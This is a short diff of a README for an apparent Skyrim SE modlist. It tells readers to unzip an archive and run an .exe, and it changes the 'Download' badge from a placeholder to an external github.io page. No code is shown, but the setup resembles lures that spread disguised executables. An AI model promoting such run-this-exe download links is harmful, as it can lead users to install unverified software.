@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to install all included mods automatically into your Skyrim SE directory.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://mega-modlist-skyrim-se.github.io/.github/)
 
 ## 📸 Overview
 ![skyrim-se-mega-modlist-visuals](https://github.com/user-attachments/assets/49febc3e-1513-4ef2-98f6-02d18b9819ef)
